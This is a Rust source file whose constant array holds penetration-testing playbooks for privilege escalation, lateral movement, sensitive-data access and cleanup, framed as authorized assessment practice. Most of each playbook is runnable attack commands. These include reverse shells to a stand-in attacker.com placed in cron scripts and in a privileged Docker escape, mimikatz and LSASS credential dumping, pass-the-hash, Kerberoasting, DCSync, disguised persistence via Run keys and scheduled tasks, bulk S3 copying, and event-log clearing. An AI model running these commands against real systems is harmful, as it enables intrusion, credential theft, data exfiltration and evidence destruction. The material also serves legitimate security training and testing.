pub const POST_EXPLOITATION_STEPS: &[(&str, &str)] = &[
    (
        "Privilege escalation",
        "OBJECTIVE: Escalate from limited user access to administrator/root privileges through exploitation of misconfigurations, vulnerabilities, or weak controls.

ACADEMIC BACKGROUND:
MITRE ATT&CK TA0004 (Privilege Escalation) documents elevation techniques across platforms. PTES Post-Exploitation phase emphasizes privilege escalation as critical for demonstrating full system compromise. CWE-269 (Improper Privilege Management) and CWE-250 (Execution with Unnecessary Privileges) are common weaknesses. NIST SP 800-53 AC-6 mandates least privilege principles.

STEP-BY-STEP PROCESS:

1. Current Privilege Assessment:
```bash
# Linux privilege enumeration:
id
whoami
groups
sudo -l  # List sudo permissions
cat /etc/sudoers 2>/dev/null
cat /etc/group | grep sudo

# Writable directories:
find / -writable -type d 2>/dev/null | grep -v proc

# SUID/SGID binaries:
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Capabilities:
getcap -r / 2>/dev/null

# Windows privilege enumeration:
whoami /all
net user %username%
net localgroup administrators
whoami /priv  # Check for SeImpersonate, SeDebug, etc.
```

2. Linux Privilege Escalation - Kernel Exploits:
```bash
# Check kernel version:
uname -a
cat /etc/issue
cat /etc/*-release

# Search for kernel exploits:
searchsploit linux kernel | grep -i \"privilege escalation\"
searchsploit linux kernel 4.15  # Specific version

# DirtyCOW (CVE-2016-5195) - works on kernels before 4.8.3:
gcc -pthread dirty.c -o dirty -lcrypt
./dirty newpassword

# Baron Samedit (CVE-2021-3156) - sudo vulnerability:
sudoedit -s /
# Grants root shell on vulnerable sudo versions < 1.9.5p2
```

3. Linux Privilege Escalation - Sudo Misconfigurations:
```bash
# Check sudo permissions:
sudo -l

# Common sudo bypasses:
# If (ALL, !root) NOPASSWD: /bin/bash:
sudo -u#-1 /bin/bash  # CVE-2019-14287

# Sudo with LD_PRELOAD:
# If env_keep+=LD_PRELOAD in sudoers:
# Create malicious library, load via LD_PRELOAD

# GTFOBins for sudo abuse:
# https://gtfobins.github.io/
# Example: sudo find /etc -exec /bin/bash \\;
```

4. Linux Privilege Escalation - SUID Binaries:
```bash
# Find SUID binaries:
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;

# Common vulnerable SUID binaries:
# nmap (older versions):
nmap --interactive
!sh

# find with exec:
find /tmp -exec /bin/bash -p \\;

# vim with sudo:
sudo vim -c ':!/bin/bash'

# less/more with sudo:
sudo less /etc/hosts
!/bin/bash
```

5. Linux Privilege Escalation - Cron Jobs:
```bash
# List cron jobs:
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*

# Writable cron scripts:
find /etc/cron* -type f -writable

# If cron job runs as root and script is writable:
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /path/to/cron_script.sh
# Wait for cron execution, catch reverse shell as root
```

6. Windows Privilege Escalation - Token Impersonation:
```bash
# Check for SeImpersonatePrivilege:
whoami /priv

# If SeImpersonate enabled, use Juicy Potato (Windows Server 2016/2019):
JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami > C:\\temp\\output.txt\" -t *

# PrintSpoofer (Windows 10/Server 2019+):
PrintSpoofer.exe -i -c cmd

# RoguePotato:
RoguePotato.exe -r attacker_ip -e \"cmd.exe\" -l 9999
```

7. Windows Privilege Escalation - Service Misconfigurations:
```bash
# Enumerate services with weak permissions:
sc query state=all
accesschk.exe /accepteula -uwcqv \"Authenticated Users\" *

# Unquoted service paths:
wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\" | findstr /i /v \"\"\"

# If service runs as SYSTEM with unquoted path:
# C:\\Program Files\\Vulnerable App\\service.exe
# Create: C:\\Program.exe
# Service restart will execute C:\\Program.exe as SYSTEM

# Modify service binary (if writable):
sc config VulnService binpath= \"C:\\temp\\reverse_shell.exe\"
sc stop VulnService
sc start VulnService
```

8. Windows Privilege Escalation - Credential Harvesting:
```bash
# Dump SAM database:
reg save HKLM\\SAM C:\\temp\\sam
reg save HKLM\\SYSTEM C:\\temp\\system

# Extract hashes with secretsdump.py (Impacket):
secretsdump.py -sam sam -system system LOCAL

# Mimikatz (if running as admin):
mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"

# LaZagne (multi-purpose credential extractor):
laZagne.exe all

# Check for stored credentials:
cmdkey /list
runas /savecred /user:administrator cmd.exe
```

9. Docker Escape (Container Privilege Escalation):
```bash
# Check if inside Docker container:
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Privileged container escape:
# If --privileged flag used:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
echo \"$host_path/cmd\" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /cmd
chmod a+x /cmd
sh -c \"echo \\$\\$ > /tmp/cgrp/cgroup.procs\"
```

10. Automated Enumeration Scripts:
```bash
# LinPEAS (Linux):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# WinPEAS (Windows):
winPEASx64.exe

# Linux Smart Enumeration (LSE):
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 2  # Level 2 enumeration

# PowerUp (Windows PowerShell):
powershell -ep bypass
Import-Module .\\PowerUp.ps1
Invoke-AllChecks
```

WHAT TO LOOK FOR:
- **Kernel Vulnerabilities**: Outdated kernels with public privesc exploits (DirtyCOW, Dirty Pipe)
- **Sudo Misconfigurations**: NOPASSWD entries, wildcard permissions, dangerous binaries in sudo
- **SUID Binaries**: Custom applications with SUID bit set, GTFOBins-listed binaries
- **Writable Cron Jobs**: Root cron scripts writable by low-privilege users
- **Windows Tokens**: SeImpersonate/SeDebug privileges enabling impersonation attacks
- **Unquoted Service Paths**: Windows services with spaces in paths without quotes
- **Stored Credentials**: Plaintext passwords in config files, registry, or credential managers
- **Weak File Permissions**: /etc/shadow readable, service binaries writable

SECURITY IMPLICATIONS:
- **Full System Compromise**: Root/SYSTEM access enables complete control over affected systems
- **Persistence**: Elevated privileges allow installation of rootkits, backdoors, persistence mechanisms
- **Lateral Movement**: Admin credentials facilitate movement to other network systems
- **Data Exfiltration**: Access to all files including sensitive databases, credentials, proprietary data
- **Compliance Violations**: Privilege escalation demonstrates failure of least privilege (NIST AC-6, ISO 27001 A.9.2)

COMMON PITFALLS:
- **Modern Protections**: SELinux, AppArmor, SMEP, SMAP, ASLR, DEP mitigate many privesc techniques
- **Patched Systems**: Current kernels and updated software eliminate known vulnerabilities
- **EDR Detection**: Endpoint security detects mimikatz, privilege escalation attempts, suspicious processes
- **Limited Context**: Some techniques require specific configurations or vulnerable software versions
- **Loud Techniques**: Kernel exploits may crash systems; credential dumping triggers alerts

TOOLS REFERENCE:
- **LinPEAS**: https://github.com/carlospolop/PEASS-ng (Linux enumeration)
- **WinPEAS**: https://github.com/carlospolop/PEASS-ng (Windows enumeration)
- **GTFOBins**: https://gtfobins.github.io/ (Unix binary exploitation)
- **LOLBAS**: https://lolbas-project.github.io/ (Living Off The Land Binaries - Windows)
- **PowerUp**: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz (Windows credential extraction)
- **Impacket**: https://github.com/fortra/impacket (Python security tools)

FURTHER READING:
- MITRE ATT&CK TA0004 Privilege Escalation: https://attack.mitre.org/tactics/TA0004/
- PayloadsAllTheThings Privesc: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks Privilege Escalation: https://book.hacktricks.xyz/
- Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/"
    ),
    (
        "Lateral movement",
        "OBJECTIVE: Move laterally through the network from compromised hosts to access additional systems, escalate privileges across the domain, and expand access footprint.

ACADEMIC BACKGROUND:
MITRE ATT&CK TA0008 (Lateral Movement) documents network traversal techniques. NIST SP 800-53 AC-4 addresses information flow enforcement to prevent lateral movement. Network segmentation (CIS Controls 12) aims to limit lateral movement impact.

STEP-BY-STEP PROCESS:

1. Internal Network Reconnaissance:
```bash
# Discover internal hosts:
nmap -sn 192.168.1.0/24
arp -a
ip neighbor show

# Enumerate domain:
net view /domain
nltest /dclist:
ldapsearch -x -h dc.domain.com -b \"dc=domain,dc=com\"
```

2. Credential Harvesting from Compromised Host:
```bash
# Linux credentials:
cat /etc/shadow
cat /home/*/.bash_history | grep password
find / -name \"*.conf\" -exec grep -i password {} \\; 2>/dev/null
cat ~/.ssh/id_rsa  # SSH private keys

# Windows credentials:
mimikatz \"sekurlsa::logonpasswords\" \"exit\"
procdump.exe -ma lsass.exe lsass.dmp  # Dump LSASS
pypykatz lsa minidump lsass.dmp  # Parse offline
```

3. Pass-the-Hash (Windows):
```bash
# Using Impacket:
psexec.py -hashes :ntlmhash administrator@192.168.1.100
wmiexec.py -hashes :ntlmhash administrator@192.168.1.100

# CrackMapExec:
crackmapexec smb 192.168.1.0/24 -u administrator -H ntlmhash --shares
crackmapexec smb 192.168.1.100 -u administrator -H ntlmhash -x \"whoami\"
```

4. Remote Code Execution on Internal Systems:
```bash
# PSExec (Windows):
psexec.py domain/user:password@192.168.1.100 cmd.exe

# WMI Execution:
wmiexec.py domain/user:password@192.168.1.100

# SSH with harvested keys:
ssh -i stolen_key user@internal_host

# RDP access:
xfreerdp /u:administrator /p:password /v:192.168.1.100
rdesktop -u administrator -p password 192.168.1.100:3389
```

5. Active Directory Exploitation:
```bash
# Kerberoasting (extract service account hashes):
GetUserSPNs.py domain.com/user:password -request -dc-ip 10.0.0.1
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (accounts without Kerberos pre-auth):
GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.1

# DCSync (replicate domain controller):
secretsdump.py domain.com/administrator:password@dc.domain.com -just-dc-user krbtgt
```

6. Pivoting Through Compromised Host:
```bash
# SSH tunneling:
ssh -L 8080:internal-server:80 user@compromised-host
# Access http://localhost:8080 to reach internal-server

# Chisel (HTTP tunnel):
# On attacker machine:
chisel server -p 9000 --reverse
# On compromised host:
chisel client attacker.com:9000 R:3389:internal-host:3389

# Metasploit pivoting:
route add 192.168.1.0 255.255.255.0 1  # Session 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run
```

7. Persistence on Additional Systems:
```bash
# SSH authorized_keys:
echo \"attacker_public_key\" >> /home/user/.ssh/authorized_keys

# Windows scheduled tasks:
schtasks /create /tn \"Windows Update\" /tr \"C:\\temp\\backdoor.exe\" /sc onlogon /ru SYSTEM

# Registry Run keys:
reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\temp\\backdoor.exe\"
```

8. Documenting Network Access:
```bash
# Create network diagram:
# Document compromised hosts, access paths, credentials used
echo \"Lateral Movement Path:
webserver01 (10.0.1.10) → SSH → appserver02 (10.0.2.20)
appserver02 → RDP → dbserver03 (10.0.3.30)
dbserver03 → SMB → fileserver04 (10.0.4.40)
Credentials Used: admin:Password123 (reused across all systems)\" > lateral_movement.txt
```

WHAT TO LOOK FOR:
- **Password Reuse**: Same credentials working across multiple systems
- **Domain Admin Accounts**: High-value targets for network-wide access
- **Unpatched Systems**: Vulnerable internal hosts for exploitation
- **Weak Network Segmentation**: Flat networks allowing unrestricted lateral movement
- **Service Accounts**: Over-privileged accounts with access to multiple systems

SECURITY IMPLICATIONS:
- **Network-Wide Compromise**: Lateral movement enables access to entire infrastructure
- **Data Breach Escalation**: Access to database servers, file servers, backup systems
- **Persistence Across Network**: Multiple compromised systems increase attacker resilience
- **Compliance Impact**: Lateral movement demonstrates inadequate network segmentation (PCI DSS 1.3, CIS Control 12)

COMMON PITFALLS:
- **Network Segmentation**: VLANs, firewalls limit lateral movement paths
- **MFA Requirements**: Multi-factor authentication blocks credential reuse
- **Monitoring Detection**: Lateral movement generates security alerts in SIEM
- **Limited Credentials**: Harvested credentials may have restricted network access

TOOLS REFERENCE:
- **CrackMapExec**: https://github.com/Porchetta-Industries/CrackMapExec
- **Impacket**: https://github.com/fortra/impacket
- **Chisel**: https://github.com/jpillora/chisel (Tunneling)
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz
- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (AD path analysis)

FURTHER READING:
- MITRE ATT&CK TA0008: https://attack.mitre.org/tactics/TA0008/
- Active Directory Security: https://adsecurity.org/
- Red Team Field Manual: https://www.amazon.com/Red-Team-Field-Manual/dp/1494295504"
    ),
    (
        "Data access validation",
        "OBJECTIVE: Locate, access, and document sensitive data within compromised environments to demonstrate business impact and regulatory compliance risks.

ACADEMIC BACKGROUND:
MITRE ATT&CK TA0009 (Collection) and TA0010 (Exfiltration) document data access techniques. GDPR Article 32 and HIPAA §164.312 mandate data protection controls. PCI DSS Requirement 3 addresses cardholder data protection. This step demonstrates compliance with data security requirements.

STEP-BY-STEP PROCESS:

1. Automated Sensitive Data Discovery:
```bash
# Linux file search:
find / -name \"*.xlsx\" -o -name \"*.docx\" -o -name \"*.pdf\" 2>/dev/null
find / -name \"*password*\" -o -name \"*credential*\" -o -name \"*secret*\" 2>/dev/null
grep -r \"password\\|api_key\\|secret\" /var/www/ /opt/ /home/ 2>/dev/null

# Windows file search:
dir /s /b C:\\*password*.txt C:\\*credentials*.xlsx
findstr /si password *.txt *.xml *.ini *.config

# Search for PII patterns:
grep -r -E \"[0-9]{3}-[0-9]{2}-[0-9]{4}\" /home/ 2>/dev/null  # SSN
grep -r -E \"[0-9]{16}\" /var/www/ 2>/dev/null  # Credit card numbers
```

2. Database Access and Enumeration:
```bash
# MySQL:
mysql -h localhost -u root -p
SHOW DATABASES;
USE customer_db;
SHOW TABLES;
SELECT * FROM users LIMIT 10;
SELECT * FROM credit_cards LIMIT 5;  # Sample sensitive data

# PostgreSQL:
psql -h localhost -U postgres
\\l  # List databases
\\c customer_db
\\dt  # List tables
SELECT * FROM users LIMIT 10;

# MongoDB:
mongo
show dbs
use customer_db
show collections
db.users.find().limit(10)

# MSSQL:
sqlcmd -S localhost -U sa -P password
SELECT name FROM sys.databases;
USE customer_db;
SELECT TOP 10 * FROM users;
```

3. File Share and Network Storage Access:
```bash
# SMB shares enumeration:
smbclient -L //fileserver -U user%password
smbclient //fileserver/finance -U user%password
get sensitive_document.xlsx

# NFS shares:
showmount -e nfs_server
mount nfs_server:/export/data /mnt/nfs
ls /mnt/nfs

# Cloud storage (if credentials found):
aws s3 ls s3://company-backups/ --profile stolen
aws s3 sync s3://company-backups/ /tmp/exfil --profile stolen
```

4. Email and Communication Systems:
```bash
# Exchange mailbox access (if credentials available):
# Via OWA, Outlook, or PowerShell:
Get-Mailbox -Identity user@domain.com | Get-MailboxStatistics

# Search for sensitive keywords:
Search-Mailbox -Identity user@domain.com -SearchQuery \"password OR confidential OR secret\"

# Slack/Teams data access (if API tokens found):
curl -H \"Authorization: Bearer xoxb-token\" https://slack.com/api/conversations.list
curl -H \"Authorization: Bearer xoxb-token\" https://slack.com/api/conversations.history?channel=C123456
```

5. Backup and Archive Access:
```bash
# Find backup files:
find / -name \"*.bak\" -o -name \"*.backup\" -o -name \"*.old\" 2>/dev/null
find / -name \"*.sql.gz\" -o -name \"*.tar.gz\" -o -name \"*.zip\" 2>/dev/null

# Extract archives:
tar -xzf database_backup.tar.gz
unzip sensitive_files.zip

# Database backup restoration (offline analysis):
mysql -u root -p < database_backup.sql
```

6. Source Code and Configuration Files:
```bash
# Git repositories:
find / -name \".git\" -type d 2>/dev/null
git log --all --full-history -- *password* *secret* *key*

# Configuration files with secrets:
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat C:\\inetpub\\wwwroot\\web.config
cat ~/.aws/credentials

# Application secrets:
cat .env
cat application.properties
cat appsettings.json
```

7. Data Classification and Sampling:
```bash
# Document data types found:
echo \"Data Classification Report:
PII Found:
- /home/databases/customers.sql (10,000 records with SSN, addresses)
- /mnt/shares/HR/employee_data.xlsx (500 employee records)

Financial Data:
- MySQL database 'payments' (5,000 credit card numbers - ENCRYPTED)
- /backup/transactions_2024.csv (100,000 payment records)

Intellectual Property:
- /opt/source_code/ (proprietary application source)
- /shares/patents/ (12 patent applications)

Authentication Credentials:
- /var/www/config.php (database credentials)
- ~/.ssh/id_rsa (SSH private keys for 3 servers)\" > data_classification.txt
```

8. Compliance Impact Assessment:
```bash
# Document regulatory implications:
echo \"Compliance Impact:
GDPR (Article 32): Personal data of EU citizens accessible without encryption
HIPAA: No PHI found (healthcare environment)
PCI DSS Requirement 3: Credit card data stored but encrypted (compliant)
SOX: Financial records accessible (quarterly reports, revenue data)
CCPA: California resident PII accessible without controls\" > compliance_impact.txt
```

9. Evidence Collection (Non-Destructive):
```bash
# Take small samples, not full datasets:
mysql -u root -p -e \"SELECT * FROM users LIMIT 5\" customer_db > sample_users.txt
head -20 /shares/finance/salaries.xlsx > salary_sample.txt

# Screenshot database contents:
# Capture screenshots showing table names, row counts, sample data

# Hash sensitive files for verification without exfiltration:
sha256sum /backup/database_full.sql > hash_verification.txt
```

10. Access Logging and Documentation:
```bash
# Document all data access:
echo \"Data Access Log:
Timestamp: 2025-11-01 14:30:00
System: dbserver01.target.com
Database: customer_db
Tables Accessed: users, payments, addresses
Records Viewed: 50 (sample)
Exfiltration: None (samples only for demonstration)
Business Impact: Full customer database accessible
Recommendation: Encrypt at rest, implement access controls\" > data_access_log.txt
```

WHAT TO LOOK FOR:
- **Personally Identifiable Information (PII)**: Names, SSNs, addresses, phone numbers, emails
- **Financial Data**: Credit card numbers, bank accounts, payment history, salaries
- **Protected Health Information (PHI)**: Medical records, patient data, diagnoses
- **Intellectual Property**: Source code, patents, trade secrets, proprietary algorithms
- **Authentication Credentials**: Passwords, API keys, private keys, tokens
- **Business-Critical Data**: Customer lists, contracts, financial reports, strategic plans

SECURITY IMPLICATIONS:
- **Data Breach Liability**: Unauthorized access to PII triggers breach notification laws (GDPR, CCPA)
- **Regulatory Fines**: GDPR fines up to €20M or 4% of revenue; HIPAA up to $1.5M per violation
- **Identity Theft**: Exposed PII enables fraud, identity theft, social engineering attacks
- **Intellectual Property Loss**: Trade secrets and proprietary data may be stolen by competitors
- **Compliance Failures**: Demonstrates inadequate data protection controls (ISO 27001 A.8.2, NIST 800-53 SC-28)

COMMON PITFALLS:
- **Encrypted Data**: Full disk encryption, database TDE, encrypted archives may protect data at rest
- **Access Controls**: Proper file permissions, database ACLs, principle of least privilege limit access
- **Data Loss Prevention (DLP)**: DLP tools detect and block sensitive data access patterns
- **Legal Constraints**: Avoid actual data exfiltration; use samples and screenshots for evidence only
- **Distributed Data**: Data spread across multiple systems, cloud services, backup locations

TOOLS REFERENCE:
- **grep/findstr**: Built-in file search tools
- **Database Clients**: mysql, psql, mongo, sqlcmd
- **BloodHound**: https://github.com/BloodHoundAD/BloodHound (Active Directory data mapping)
- **LaZagne**: https://github.com/AlessandroZ/LaZagne (Credential extraction)

FURTHER READING:
- MITRE ATT&CK TA0009 Collection: https://attack.mitre.org/tactics/TA0009/
- GDPR Article 32: https://gdpr-info.eu/art-32-gdpr/
- PCI DSS Requirement 3: https://www.pcisecuritystandards.org/
- HIPAA Security Rule: https://www.hhs.gov/hipaa/for-professionals/security/"
    ),
    (
        "Cleanup procedures",
        "OBJECTIVE: Remove all artifacts, tools, and evidence of penetration testing activities to restore systems to their pre-assessment state.

ACADEMIC BACKGROUND:
PTES Post-Exploitation Cleanup emphasizes responsible testing practices. Professional penetration testing standards (CREST, OSCP) require comprehensive cleanup documentation. NIST SP 800-115 Section 9 addresses post-assessment activities including artifact removal.

STEP-BY-STEP PROCESS:

1. Artifact Inventory and Documentation:
```bash
# Create comprehensive artifact list before cleanup:
echo \"Artifacts Created During Assessment:
Files Uploaded:
- /tmp/linpeas.sh (enumeration script)
- /var/www/html/uploads/shell.php (web shell)
- /home/user/.ssh/authorized_keys (backdoor SSH key)

Processes Started:
- nc -lvnp 4444 (reverse shell listener on compromised host)
- python3 -m http.server 8000 (HTTP server for file transfer)

User Accounts Created:
- backdoor_user (UID 1001) - Linux
- test_admin (Administrator group) - Windows

Registry/Configuration Changes:
- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor
- /etc/crontab entry for persistence

Network Connections Established:
- Reverse shell to attacker.com:4444
- SSH tunnel to internal network via compromised host\" > cleanup_inventory.txt
```

2. Remove Uploaded Files and Tools:
```bash
# Linux file removal:
rm -f /tmp/linpeas.sh
rm -f /tmp/pspy64
rm -f /var/www/html/uploads/shell.php
rm -f /tmp/.hidden_backdoor
rm -rf /tmp/exploit_tools/

# Windows file removal:
del C:\\temp\\winpeas.exe
del C:\\inetpub\\wwwroot\\uploads\\shell.aspx
del C:\\Windows\\Tasks\\backdoor.exe
rmdir /s /q C:\\temp\\tools

# Verify removal:
ls -la /tmp/ /var/www/html/uploads/
dir C:\\temp\\ C:\\inetpub\\wwwroot\\uploads\\
```

3. Terminate Processes and Network Connections:
```bash
# Kill reverse shells and listeners:
killall nc
pkill -f \"python.*http.server\"
pkill -f reverse_shell

# Windows process termination:
taskkill /F /IM backdoor.exe
taskkill /F /IM mimikatz.exe

# Close SSH tunnels:
ps aux | grep \"ssh -L\"
kill <PID>

# Verify no lingering processes:
ps aux | grep -E \"nc|chisel|metasploit|mimikatz\"
netstat -antup | grep ESTABLISHED
```

4. Remove User Accounts and Backdoors:
```bash
# Linux user removal:
userdel -r backdoor_user
sed -i '/attacker_ssh_key/d' /home/*/.ssh/authorized_keys
sed -i '/attacker_ssh_key/d' /root/.ssh/authorized_keys

# Windows user removal:
net user backdoor_admin /delete
reg delete \"HKLM\\SAM\\SAM\\Domains\\Account\\Users\" /f  # If created test accounts

# Verify removal:
cat /etc/passwd | grep backdoor
net user
```

5. Revert Configuration Changes:
```bash
# Remove cron jobs:
crontab -l  # List current crons
crontab -e  # Remove malicious entries
rm -f /etc/cron.d/backdoor

# Remove Windows scheduled tasks:
schtasks /Delete /TN \"Windows Update\" /F
schtasks /Delete /TN \"Backdoor\" /F

# Remove registry persistence:
reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /f

# Restore modified configurations:
git checkout /etc/apache2/apache2.conf  # If using version control
cp /etc/apache2/apache2.conf.bak /etc/apache2/apache2.conf  # From backup
```

6. Log Cleanup (if authorized):
```bash
# Linux log cleanup (ONLY if explicitly authorized):
# Clear bash history:
history -c
cat /dev/null > ~/.bash_history

# Clear auth logs (may break forensics - rarely authorized):
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/apache2/access.log

# Windows event log clearing (ONLY if authorized):
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Note: Log manipulation is often NOT authorized and breaks incident response
# Document what logs contain evidence rather than deleting
```

7. Database Cleanup:
```bash
# Remove test data inserted:
mysql -u root -p -e \"DELETE FROM users WHERE username='test_account'\" database_name
mysql -u root -p -e \"DROP TABLE IF EXISTS test_table\" database_name

# Remove injected stored procedures:
mysql -u root -p -e \"DROP PROCEDURE IF EXISTS malicious_proc\" database_name

# Verify cleanup:
mysql -u root -p -e \"SHOW TABLES\" database_name
```

8. Firewall and Network Rule Cleanup:
```bash
# Remove temporary firewall rules:
iptables -D INPUT -p tcp --dport 4444 -j ACCEPT
ufw delete allow 4444

# Windows firewall:
netsh advfirewall firewall delete rule name=\"Backdoor Port\"

# Verify no unauthorized rules remain:
iptables -L -n
netsh advfirewall firewall show rule name=all
```

9. Cloud and External Service Cleanup:
```bash
# Remove S3 buckets created for exfiltration:
aws s3 rb s3://test-exfiltration-bucket --force

# Delete AWS EC2 instances spawned:
aws ec2 terminate-instances --instance-ids i-1234567890abcdef0

# Revoke API keys created:
# Azure, AWS, GCP consoles - delete test service accounts
```

10. Cleanup Verification and Documentation:
```bash
# Verify all artifacts removed:
find / -name \"*linpeas*\" -o -name \"*winpeas*\" -o -name \"*shell.php*\" 2>/dev/null
ps aux | grep -E \"nc|backdoor|reverse\"
netstat -antup | grep -E \"4444|reverse\"
crontab -l
cat /etc/passwd | grep -E \"backdoor|test\"

# Create cleanup report:
echo \"Cleanup Verification Report:
Date: 2025-11-01 16:00:00
Performed By: Senior Pentester

Artifacts Removed:
✓ All uploaded tools and scripts (8 files)
✓ Web shells and backdoors (2 files)
✓ Reverse shell processes terminated (3 processes)
✓ SSH tunnels closed (1 tunnel)
✓ User accounts deleted (2 accounts)
✓ Cron jobs removed (1 job)
✓ Registry keys deleted (1 key)
✓ Test database entries removed

Verification Commands Executed:
✓ find / -name \"*linpeas*\" (0 results)
✓ ps aux | grep backdoor (0 results)
✓ crontab -l (no malicious entries)
✓ netstat -antup (no suspicious connections)

System State:
✓ Services operational (apache2, mysql, sshd)
✓ No unauthorized accounts
✓ No suspicious processes
✓ Firewall rules verified

Remaining Evidence (Authorized):
- Log entries in /var/log/auth.log (for client review)
- Network traffic captures (in assessment report)
- Screenshots and documentation (in deliverables)

Client Notification: Security team notified of cleanup completion
Next Steps: Final report delivery, debrief meeting scheduled\" > cleanup_verification_report.txt
```

WHAT TO LOOK FOR:
- **All Uploaded Files**: Scripts, exploits, web shells, backdoors completely removed
- **No Running Processes**: Reverse shells, listeners, tunnels terminated
- **Clean User Accounts**: No unauthorized or test accounts remaining
- **Reverted Configurations**: Cron jobs, scheduled tasks, registry keys, firewall rules restored
- **System Stability**: Services operational, no degraded performance
- **Log Entries**: Evidence documented but artifacts removed (if authorized)

SECURITY IMPLICATIONS:
- **Professional Responsibility**: Incomplete cleanup leaves systems vulnerable and breaches contracts
- **Ongoing Backdoors**: Left-behind persistence mechanisms may be exploited by real attackers
- **System Instability**: Unremediated changes may cause service failures
- **Legal Liability**: Failure to cleanup may constitute unauthorized system modification
- **Trust Damage**: Poor cleanup practices harm client relationships and professional reputation

COMMON PITFALLS:
- **Immutable Logs**: Centralized logging (SIEM, Splunk) cannot be modified from compromised hosts
- **Backup Systems**: File removal doesn't affect backups taken during assessment
- **Forensic Artifacts**: Registry hives, USN journal, $MFT retain evidence of file operations
- **Network Traffic**: IDS/IPS logs, NetFlow data, packet captures remain on network devices
- **Cloud Persistence**: EC2 instances, Lambda functions, S3 buckets may persist after assessment
- **Incomplete Inventory**: Forgetting to document all artifacts leads to missed cleanup items

TOOLS REFERENCE:
- **find/grep**: Built-in search tools for artifact verification
- **ps/netstat**: Process and network connection enumeration
- **crontab/schtasks**: Scheduled task management
- **iptables/netsh**: Firewall rule management

FURTHER READING:
- PTES Post-Exploitation: http://www.pentest-standard.org/index.php/Post_Exploitation
- NIST SP 800-115 Section 9: Post-Assessment Activities
- CREST Penetration Testing Guide: https://www.crest-approved.org/
- SANS Pentesting Best Practices: https://www.sans.org/white-papers/"
    ),
];